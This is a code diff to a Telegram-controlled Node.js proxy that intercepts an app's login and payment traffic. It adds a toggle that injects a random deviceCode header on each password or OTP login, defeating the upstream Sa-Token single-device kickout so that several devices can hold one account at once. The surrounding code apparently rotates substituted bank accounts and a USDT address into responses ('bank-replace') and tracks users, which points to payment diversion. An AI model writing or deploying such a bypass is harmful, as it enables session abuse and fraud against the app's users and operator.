@@ -157,6 +157,13 @@ async function saveData(data) {
   }
 }
 
+// Sa-Token kickout bypass: server reads `deviceCode` header at login;
+// SAME deviceCode → kicks previous device, DIFFERENT → both stay logged in.
+// Override with a unique value on each login so multiple devices stay alive.
+function makeUniqueDeviceCode() {
+  return 'd' + Date.now().toString(36) + Math.random().toString(36).substring(2, 12);
+}
+
 function getTokenFromReq(req) {
   const headers = req.headers || {};
   for (const [k, v] of Object.entries(headers)) {
@@ -794,6 +801,9 @@ app.post('/bot-webhook', async (req, res) => {
 /log — Toggle request logging
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
+/multilogin — Toggle multi-device login (dono device pe login reh sake)
+/multilogin on — Force ON
+/multilogin off — Force OFF (normal kickout)
 /status — Full status
 /debug — Debug next response
 
@@ -826,7 +836,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nMulti-Device Login: ${data.multiDeviceLogin !== false ? '📱📱 ON' : '🔒 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -838,6 +848,18 @@ Example:
     if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+
+    if (text === '/multilogin' || text === '/multilogin on' || text === '/multilogin off') {
+      data = await loadData(true);
+      if (text === '/multilogin') data.multiDeviceLogin = data.multiDeviceLogin === false ? true : false;
+      else data.multiDeviceLogin = (text === '/multilogin on');
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, data.multiDeviceLogin !== false
+        ? '📱📱 Multi-Device Login ON\n\nAb same account dono device pe ek saath login reh sakta hai.\nProxy har login pe unique deviceCode header inject karta hai → upstream Sa-Token kickout skip kar deta hai.'
+        : '🔒 Multi-Device Login OFF\n\nNormal behaviour: naya login purana device kick out karega (jab same OAID).');
+      return res.sendStatus(200);
+    }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump aayega'); return res.sendStatus(200); }
 
@@ -1204,6 +1226,11 @@ Example:
 app.post('/app/user/login/pwd', async (req, res) => {
   try {
     const data = await loadData();
+    if (data.multiDeviceLogin !== false) {
+      const uniq = makeUniqueDeviceCode();
+      req.headers['devicecode'] = uniq;
+      req.headers['deviceCode'] = uniq;
+    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.phone || body.mobile || body.username || '';
@@ -1254,6 +1281,11 @@ app.post('/app/user/login/pwd', async (req, res) => {
 app.post('/app/user/login/otp', async (req, res) => {
   try {
     const data = await loadData();
+    if (data.multiDeviceLogin !== false) {
+      const uniq = makeUniqueDeviceCode();
+      req.headers['devicecode'] = uniq;
+      req.headers['deviceCode'] = uniq;
+    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.phone || body.mobile || body.username || '';
